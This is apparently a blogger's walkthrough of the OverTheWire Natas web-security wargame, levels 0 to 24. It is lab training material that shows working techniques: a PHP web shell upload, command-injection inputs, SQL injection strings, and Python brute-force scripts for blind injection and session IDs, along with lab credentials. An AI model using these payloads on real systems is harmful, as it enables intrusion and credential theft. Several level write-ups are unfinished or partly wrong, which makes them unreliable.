# Natas

Since I completed Bandit I figured I'd just keep rolling, and see what other things we could do. The next wargame on the list was "Natas", it's longer than Bandit, and it's about web-stuff, so it should be fun (he said without knowing anything about the challenges that lie ahead). So, without further mucking about, let's get cracking with Natas!

## Level 00

OK, so for Level 00 we're given a password and a username and told to go to the website where the challenges are hosted. Simple stuff. 

We're being asked to find the password on the page...

`Right click > View Source` 

Hey look, there it is, commented out, as is the way with these things.

NEXT!

## Level 01

So, to get onto the next "challenge" we have to use the password from the previous level (same as with Bandit), don't get distracted by the "Submit" button, that takes you elsewhere to a place where you can brag and be l33t.

We're not interested in that, so we'll just stick with going to the next level. Which we'll go ahead and do right now, so take the password from the previous level and combine it with the username `natas1` and you should get access to the page which hosts the challenge.

OK, again, pretty simple stuff.

We can't right click, so we'll just use the contextual menus at the top of the browser window instead (or in Firefox just hit `Ctrl+U`), if you can't see them then just hit `Alt` once, and they should pop out.

Got the password? Dope, let's move on!

## Level 02

> There is nothing on this page

I don't believe you website! I don't believe you at all!

HA! I knew it!

But it's not immediately obvious where our precious key is this time... 

So let's note things that stand out. First of all has to be that bit of JavaScript setting a variable called `wechallinfo`, but I think that might have something to do with the silly score posting thing... So we'll ignore that for now. (Confirmation: Yes it is, we can ignore that for the rest of this challenge)

The other thing on the page is an image called `pixel.png` and wouldn't you know it, it's exactly 1 pixel by 1 pixel. But the interesting thing is not the tiny invisible image, more the fact that it's in a folder, that looks like it's accesible. And it is, check out that `users.txt` file, and you should see what you're looking for. 

## Level 03

I had to do a double take on this one. But check that source code again. The developer appears to be quite happy about the fact that he's "hidden" something from Google. Now, the only way to hide from the Google Monster, that I'm aware of, is to add places into your `robots.txt` file, or use a `.onion` address. And since we're not connected through Tor, we'll go for option A, the `robots.txt` file.

Yup, it looks like we can not only access it, but there is some interesting information in there as well, namely an endpoint that the developer didn't want Google to see called `/s3cr3t/`. Just don't make the mistake I made at first and head over there with `view-source:` in your brower, and get really confused as to why you can't see the files there.

Anyway, it's in the `users.txt` folder again, so grab that and we'll get rolling to Level 05.

## Level 04

Oooh, it looks like we might have to employ the use of BurpSuite for this one, and maybe from here on out? Let's get that fired up, and get ourselves logged in. 

```
 Access disallowed. You are visiting from "http://overthewire.org/wargames/natas/natas4.html" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
```

OK, so to solve this we're going to need to modify our request as it's being sent to the server, so we'll capture it using BurpSuites proxy. 

```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas4.natas.labs.overthewire.org/
Cookie: __cfduid=d74978c537f6f62c0ce05051118367ad41519729856; __utma=176859643.1184866717.1519729857.1519848774.1519851353.7; __utmz=176859643.1519729857.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643; __utmb=176859643.17.10.1519851353; __utmt=1
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Ahh, notice the `Referer` header has been set? 

Ok, so let's change that to the one it wants... And bingo.. We're in!

NEXT!

## Level 05

> Access disallowed. You are not logged in

Hmmmm, back to BurpSuite!

Let's capture that initial request and see what it's talking about...

```
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://overthewire.org/wargames/natas/natas5.html
Cookie: __cfduid=d74978c537f6f62c0ce05051118367ad41519729856; __utma=176859643.1184866717.1519729857.1519848774.1519851353.7; __utmz=176859643.1519729857.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643; __utmb=176859643.17.10.1519851353; __utmt=1; loggedin=0
Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Again, we're checking this for things that stand out. In this case there is something tagged onto the end of our Cookie called `loggedin`, and it's set to `0` AKA the binary value for `False`, so let's just correct that. 

And we should be in. If not, the value you needed to set was `1`, not `True`.

Sorted? Awesome sauce!

## Level 06

Yay! User input!

In this level we're being asked for a "secret", which we obviously have no way of knowing. 

Helpfully we're given the source code to this level, so we can try and work out what we have to do:

```
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```
OK, so a quick look at this thing points us to another potential directory traversal issue. It looks like the script is pulling from `includes/secret.inc` to get the value of the secret for this level.

So, let's head over there!

Nothing here?

`Right Click > View Source`

Ah-Ha! Copy that value, and paste it into the `Input Secret` bit on the website, and we're good to go.

Moving on!

## Level 07

I kinda like this one. 

Straight away we're given a hint (if you `Right Click > View Source`, which should now be your default action when heading to one of these things)

> <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

So naturally, the first thing we should do is try and head over to that endpoint and see if it resolves:

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /etc/natas_webpass/natas8 was not found on this server.</p>
<hr>
<address>Apache/2.4.10 (Debian) Server at natas7.natas.labs.overthewire.org Port 80</address>
</body></html>
```

No surprise there, it's gonna be a bit harder than that.

Let's take another look at that "webpage";

OK, so we have two hyperlinks, and a link to the "post your score" thing which we're ignoring. 

Let's take a closer look at those hyperlinks.

Ahhh, it seems that they aren't straight `href` tags, they are actually using a parameter to call the page (something you see quite often in the real world)

With that in mind, lets try adding in `/etc/natas_webpass/natas8` to the path variable in the request and see what happens...

`http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

WOOP!

(I'm actually really enjoying this series of challenges, the difficulty is ramping up nicely)

## Level 08

Deja-vu.

Similar to Level 06, we have another User input field, and a link to view the source code. (No hints in the sourcecode of the main page this time though)

Checking out the source code we can see the following interesting bits:

```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

OOOOH, interesting. `bin2hex`, `strrev` and `base64_encode` are all PHP functions, (obviously), but the interesting thing about these is that we can test this out locally and just reverse engineer the password.

TO THE PHPMOBILE!

`php -a`

OK, so the function is doing `bin2hex`, `strrev`, then `base64_encode`. So to reverse it, we'll have to do `base64_decode`, `strrev`, then `hex2bin`. Cool? Cool.

```
root@kali [23:29:56] [~/Brainpan] 
-> # php -a
Interactive mode enabled

php > $thing = "3d3d516343746d4d6d6c315669563362";
php > $new_thing = base64_decode(strrev(hex2bin($thing)));
php > var_dump($new_thing);
```

Boosh, we have a "secret". Let's enter that into the user input field and see if it works!

WOOP!

I had to use this for reference to solve this [PHP hex2bin](http://php.net/manual/en/function.hex2bin.php)

## Level 09

Let's get cracking with Level 09! (If you can't tell, I'm actually really enjoying myself here).

First off, a quick check of the source code, just to see if we've been given any hints.

Nope, nothing happening here, so let's check out the source code for this level.


Pulling out the interesting bit(s) we find:
```
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

Haha! Well we found a nice little way to break this application almost immediately. Entering a `*` will break out of the `passthru` command and dump the source code (which I'm guessing is not the intended functionality)

(Note: I also tried the word `haystack` for I'm guessing obvious reasons)

OK, so let's be methodical about this. 

If we enter `""` then we get a dump of all of the values in the list. Which makes sense, because that's what the first bit of the code is doing. The bit we're actually interested in is that second `if` statement. `if($key != "")` i.e. if we enter something other than "" into the thing we're running a `grep` command. Awesome. I suppose we should probably check if it's possible to break out of this, but we'll save that for afterwards.

What happens if we start entering some operators? 

`& echo test`

Huh, so it looks like we might have some command injection?

If we enter the command pasted above we get it reflected back at us...

`& echo blah`

```
Output:

blah dictionary.txt
```

So let's try a simple command injection:

`& exec("id");`

Does nothing, but probably executed silently, so this probably isn't the way to do this box. Good to note though. OK, so what are we missing here? Let's step through that source code line by line and see if we can see something weird. 

The first thing that I can spot is that we're setting the value of `$key` to `""` then that is used in a check later on. Moving on from that we're doing a simple check to see if the `$key` varible is anything other than `""`, then we're calling `passthru` which is basically the same as `exec`, and asking it to `grep` the contents of `dictionary.txt` for the value of `$key`. 

The thing to note about this one is that we're setting the value of `$key` in our input


## Level 10

OK, so we're looking at another implementation of `passthru` in PHP. But this time the developer has added some extra security in the form of input filtering.

We can't use any of the following characters:

- ; 
- | 
- &

That's a semi-colon (statement terminator), a "pipe" (for directing output), and an Ampersand (global AND symbol). Basically the three things we'd need to do some more fun things like command injection or whatever. 

Soooo, what can we do about this?

Well my first instinct was to use URL-encoding, but it saw right through that. 

`; ls ;` => `%3b%20%6c%73%20%3b`

So, what other options do we have here? 

Well, there is always Base64. But, without decoding whatever we pass it, the application won't know what to do with a Base64 encoded string...

TO THE PHPMOBILE!

`php -a` 

Let's just re-familiarise ourselves with the way that `base64` works in PHP.

```
$first = "ThingsAndStuff";
$second = base64_encode($first);
$third = base64_decode($second);
```

Pretty simple, right? Except we still have the same issue of our command characters being "illegal". So using encoding probably isn't what we should be looking at (but hey, we brushed up on our base64, so all is not lost)

The actual answer to this one is pretty simple. 

If we look at the way the string is being handled we aren't left with many options as to how we're going to break out. 

`'' /etc/natas_webpass/natas11`



## Level 11

This one is rather cool, there are a few ways to achieve victory as well, which is nice. I say there are a few ways, there are as many ways as you know programming languages, and if you don't know any then this is basically the same as the challenge where we had to do some reversing of an encoded string. 

The basic gist to this is that we're going to be replacing the cookie the page gives us by default. 

```
root@kali:~# python
Python 2.7.14+ (default, Dec  5 2017, 15:17:02) 
[GCC 7.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> thing = '{"showpassword":"no","bgcolor":"#ffffff"}'
>>> B_64 = base64.b64.decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'module' object has no attribute 'b64'
>>> B_64 = base64.b64decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=")
>>> def xor_strings(xs, ys):
...     return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
... 
>>> xor_strings(thing, B_64)
'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq'
>>> thing = '{"showpassword":"yes","bgcolor":"#ffffff"}'
>>> xor_strings(thing, B_64)
"qw8Jqw8Jqw8Jqw8Jq`2\x1b\x7fyxOu{;Il' Rp28Jqw8\x0e."
>>> len(thing)
42
>>> len('qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq')
41
>>> len('qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw')
42
>>> key = 'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw'
>>> base64.b64encode(xor_strings(thing, key))
'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'
>>> 
```

That first base64 string was taken from BurpSuite.

We also used BurpSuite to push the "new" cookie into the request.

1. Grab cookie
2. decode it (Base64)
3. Grab the `show password` flag (leave it as "no")
4. use the `xor_strings` function
5. set the return value as `key`
6. base64 encode `xor_strings` using `key` and `show_password` (changed to "yes")
7. Use the new base64 as your cookie
8. ???
9. Profit!

## Level 12

OK, so we have a file upload... 

Checking through the source it doesn't look like it's actually checking whether the file that's being uploaded is actually a JPEG. Although it is checking that the length is no bigger than 1000 bytes (1kb).

If we intercept the upload form in Burp we get something that looks like the following:

```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas12.natas.labs.overthewire.org/index.php
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------507701271412881433998838798
Content-Length: 480

-----------------------------507701271412881433998838798
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------507701271412881433998838798
Content-Disposition: form-data; name="filename"

p6qwm188bx.txt
-----------------------------507701271412881433998838798
Content-Disposition: form-data; name="uploadedfile"; filename="testfile.txt"
Content-Type: text

this is a test

-----------------------------507701271412881433998838798--
```

The bit we're interested in is the bottom part (although in a real world scenario we could cripple this server by uploading crap loads of data just by manipulating the "MAX_FILE_SIZE", but that isn't our goal here) where we're setting the content of our file.

So, what would happen if we were to change our "jpeg" file to something else?

Well, the first thing that happens is that the application tries to change the file extension of whatever we upload to ".jpeg", which causes errors when we try and view the file. Especially if the ".jpeg" we just uploaded is actually just an ASCII/text file with a fake extension. 

But, the checks are all happening on the client side, not the server side, so we can manipulate out input and get it to upload as whatever we want (preferably something we can actually read)

For my test upload (the one just above that I used as an example) I just used a plain text file with the content of `this is a test`, corrected the file extension at the upload using BurpSuite, then checked that it rendered properly (i.e. the file is actually being executed by the server), which it did, I managed to get my original file reflected back at me.

So, what would happen if we gave it something more interesting, like a PHP file?

`<?php echo system($_GET['system']); ?>`

This awesome little one-liner takes whatever we pass in under the `system` parameter, and executes it as whatever use it is currently logged in as.

Then, using BurpSuite, we can just pass it something like the following string:

`/upload/q0l9fy3cvu.php?system=cat+/etc/natas_webpass/natas13` 

## Level 13

OK, so this is the same as the previous one, except this time the "developer" has put a check in to make sure we're uploading an image file... 

I'm thinking we're going to have to modify that "MAX_FILE_SIZE" parameter because finding an image that is actually less than 1kb is quite difficult. (Edit: didn't bother with this in the end, we just made the payload fit the limit)

```
POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas13.natas.labs.overthewire.org/index.php
Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------15378711974067201491555851762
Content-Length: 4111

-----------------------------15378711974067201491555851762
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------15378711974067201491555851762
Content-Disposition: form-data; name="filename"

obu30xz3fl.jpg
-----------------------------15378711974067201491555851762
Content-Disposition: form-data; name="uploadedfile"; filename="index.png"
Content-Type: image/png

PNG

```


So for this one, we just cut off the end of the image, and replaced it with the same PHP command from the last challenge. We also had to change the `Content-Disposition: form-data; name="filename"` to something with a `.php` extension.

`4kz8xq6r1i.php?system=cat+/etc/natas_webpass/natas14`

## Level 14

SQL Injection

Awesome, not done this for a while

`$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";` 

"' OR 1=1;--

```
Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
Access denied!
```

Took me a while playing around with the POST request to get the right value.

`username=natas15&password="*"`

<!-- this needs more of a write up -->

## Level 15

We've been given a means to search for "users", via an input form. Let's take a look at the source code and see if we can't find the vulnerability.

```
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?> 
```

If we use `natas16` as the Username, we get a confirmation that the user exists, which is awesome, we'd be screwed if it didn't.



```
import requests
import string

password = ""
chars = list(string.ascii_lowercase)
chars2 = list(string.ascii_uppercase)
numbs = list(range(10))
combo = chars+chars2+numbs


while True:
   for c in combo:
       url = "http://natas15.natas.labs.overthewire.org/index.php"
       #url = "http://ptl-b4178f0b-d147a1d2.libcurl.so/?search=admin%27+%26%26+this.password.match(/^{}{}.*$/)%00".format(password, c)
       post_data = { 'username' : "natas16\" and password like binary '{}{}%'#".format(password, c)}
       resp = requests.post(url, data=post_data, headers={"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="})
       if "This user exists." in resp.text: # Test for correct guess
           password += str(c)
           print "Current State of password: {}".format(password)
       continue
```

`natas16" AND password LIKE 'W%'"`

^ This is the first thing we tried, and we got a positive return, so we know we have a blind injection. But it kinda sucks guessing at stuff (also I genuinely tried "W" first, no idea why) so we wrote a little Python script to do it for us. 

Annnnnd we mucked it up, we got a password back, but it 

`natas16" AND password LIKE BINARY 'WaI%'"`

## Level 16
This next one is interesting, it's a combination of one of the earlier challenges (where we had to beat a `grep`), and the last challenge where we had a blind SQL injection. 

To beat this we'll have to write some new Python, the flow of the script is as follows:

1. Fire off a command injection
2. If the output is Blank, we've got a hit, jump to 4
3. If the output contains a known word we missed, go back to 1
4. Concatenate the characters into a string
5. Spit it out at the end

Pretty simple right? Let's get coding!


So I tried using a script I found online, but I couldn't figure out how it was working, so I modified it a bit.

```
import requests
import string
from requests.auth import HTTPBasicAuth

# Password from the last level
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

# Initiate some empty strings
filteredchars = ""
password = ""

# Build the word list
chars = list(string.ascii_lowercase)
chars2 = list(string.ascii_uppercase)
numbs = list(range(10))
combo = chars+chars2+numbs


# Loop through the list
for char in combo:
    thing = 'http://natas16.natas.labs.overthewire.org/?needle=bullfrogs$(grep '+str(char)+' /etc/natas_webpass/natas17)'
    req = requests.get(thing, auth=auth)

    if 'bullfrogs' not in req.text:
        filteredchars = filteredchars+str(char)

print "Filtered Character List: "+ filteredchars

for i in range(32):
    for char in filteredchars:
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=bullfrogs$(grep ^'+password+char+' /etc/natas_webpass/natas17)', auth=auth)
        
        if 'bullfrogs' not in r.text:
            password = password+char
            break


print "Password: "+password
```

## Level 17

Talk about the blind leading the blind. Not only do we have ourselves a blind SQL injection, but this time we don't even have a normal output to query...

How the hell are we going to pull this one off?

```
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?> 
```


OK, so we're doing a SQL call, using the variable we get from `username`. 

That's kinda where we're screwed though, because at that point all of the `echo` commands have been commented out... So, do we have to chain a command injection here?

After some Googling, and some serious thinking, I was reminded of timing attacks.

A timing attack is a technique we can use with blind injection to help determine responses that are being processed by the server. I.e. if we send a `sleep` or `wait` command we can then filter on the responses that are arbitrarily long compared to others. 

## Level 18

Well damn, that's a lot of sauce!

```
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
} 

if($showform) {
?> 
```


There's a lot going on here, but it's PHP, so we can just start at the top and work our way down.

Straight away we have a variable called `maxid`, with a value of 640, and a comment saying "640 should be enough for everybody" (Bill Gates reference?). THe fact that we have a `max` value for something suggests we might be able to get the application to perform in interesting ways if we pass it something beyond that value, or we create more id's than the maximum allows (something to play with later)

Next we have a rather juicy looking function called `isValidAdminLogin`, but it appears to have been disabled. So that might be something we want to try and break into to reactivate?

Following that admin login function we have three functions, the first just checks if the value being passed in is actually a number, the second uses the `maxid` to generate a random `id`. Then we have a `debug` function which, it's probably safe to assume, activates a debug mode.

Bit juicier this next function, `my_session_start` checks our `PHPSESSID` against that `isValidID` function, then looks to start a `debug` session as the `admin` user. Which is something we really want to investigate once we're done with the analysis.

Following on from this is a function called `print_credentials` which as the name might suggest, prints the credentials for the next level. And it looks like being logged in as the `admin` user is the way to get there. 

Finally we have a bit of logic. The crux of which is an `if` and an `else` that will determine if we get to play in the next level.

... Phew

The TL;DR of all that is that we need to break out the python and bruteforce us a Session ID. 

```
import requests

# Didn't know you could use Basic Auth in this way! :) 
# Log into the website
target = "http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/"
post_value = {'username':'admin', 'password[]':''}

for n in range(640):
    cookie = {"PHPSESSID": str(n)}
    r = requests.post(target, data=post_value, cookies=cookie)
    if "You are an admin" in r.text:
        print r.text
        break

```

The trick to this one is that we have a "max ID" value, that means that the admin user MUST be one of those values, so we just have to try them all until we find the right one. This is easily done by just setting up a `for` loop and going through it until we get the output we want then `break`'ing so we don't miss our key. 

## Level 19

The code for this one is very similar, so I won't bother pasting it here, the main difference is the way that the Session ID is generated. Instead of just being an integer value, as in the last level, the value is an ASCII-Hex string. 

We can easily generate a bunch of these though.

```
import requests

url = "http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/"

for n in range(1000):
    my_string = str(n)+"-admin"
    payload = "".join(["{:02X}".format(ord(x)) for x in my_string]).lower()
    cookie = {"PHPSESSID": str(payload)}
    post_data = {'username':'admin', 'password':'admin'}

    r = requests.post(url, data=post_data, cookies=cookie)

    if "You are an admin" in r.text:
        print r.text
        break
```



## Level 20

This one needs a proper write up. 

```
curl "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org?name=admin%0Aadmin%201" --cookie "PHPSESSID=hackingthings"
```


```
curl "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org" --cookie "PHPSESSID=hackingthings"
```

Something about writing the session token (not good enough!)



## Level 21

This challenge takes place over two pages, which is a new one for this series, everything else has been on a single page so far. The first page simply contains a link to the "CSS Experimenter", which allows us to make POST requests with parameters... :evilgrin:

Similar to the last one, we're going to abuse the following bit of code to drop our own session token, then attach to it. 

```
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
} 
```

This bit of code basically sets a `$_SESSION` token based on the "submit" parameter being present in the POST request. 

Something we should have done earlier as well, is to turn on the "DEBUG" mode, by providing a `?debug` parameter onto out initial GET request. This will allow us to see what is being stored in the session.

To exploit this vulnerability is a two part process, same as the last one. 

First we need to set ourselves an `admin` flag.

This is trivial, all we need to do is capture the request in Burp then add `admin=1` onto the end of the POST request that we make to the "CSS Experimenter".

After we've done this, and confirmed that we can see the admin flag in the session, we can take the generated session token (or just provide our own for the sake of education) and use it on the first page (the one that links to the CSS generator) and we should get an admin session back.

```
POST /index.php?debug HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas21-experimenter.natas.labs.overthewire.org/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Cookie: __cfduid=dc8d1ca00f5e6ddf88da93337662ff66b1523893447; PHPSESSID=hackingthings
Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==
Connection: close
Upgrade-Insecure-Requests: 1

align=center&fontsize=100%25&bgcolor=pink&submit=Update&admin=1
```

> Setting the admin flag and session token

```
GET / HTTP/1.1
Host: natas21.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: __cfduid=dc8d1ca00f5e6ddf88da93337662ff66b1523893447; PHPSESSID=hackingthings
Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

> Attaching to our session token that has the `admin` flag set.

## Level 22

Really simple one this time, the main issue is a built-in redirect, which we can get around using Burp to intercept the request before it gets redirected. 

Then we simply need to send up the parameter `revelio` and we get the flag. Pretty simple sstuff. 

Moving on!

## Level 23

This one annoys me, because it uses the `strstr` function in PHP which doesn't act in the way that you would expect it to initially, and the documentation contains some seriously wonky user submitted examples which only serve to confuse the matter. 

Basically, the way this thing works is to search a string for the existence of another string (a $needle in a $haystack to use PHP's terminology). We already know what string to put in ("iloveyou"), and we have an idea of how long the string needs to be ("> 10", even though PHP doesn't explicitly state that it is looking for a length, just a value greater than X (*sigh*).

So, all we need to do here is to capture the request and modify the value we send up so that it conforms to the following rules:

1. String must contain the phrase "iloveyou"
2. String must be at least 10 characters in length
3. String must be complete (no breaks)

That gives us limited options as to how to send it up to the server. 

`iloveyou11111`

`11111iloveyou`

And that's pretty much it.


## Level 24

This one is quite interesting as it takes advantage of an issue with `strcmp()` the PHP function that thinks it's a C function.

```
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

So we are looking for a value that is NOT equal to the value we're looking for. i.e. we're looking for the application to return a 0.

To get the application to drop a 0, we need to get it to break. And to get it to break we need to pass it something it can't deal with, lucky for us `strcmp()` doesn't deal well with anything that isn't a string. So, if we modify our request to make the initial parameter an array, we can force the application to error on a type mismatch, resulting in the 0 return.

```
GET /?passwd[]=funkyouiaml33t HTTP/1.1
Host: natas24.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas24.natas.labs.overthewire.org/
Cookie: __cfduid=dc8d1ca00f5e6ddf88da93337662ff66b1523893447
Authorization: Basic bmF0YXMyNDpPc1JtWEZndW96S3BUWlo1WDE0ek5PNDMzNzlMWnZlZw==
Connection: close
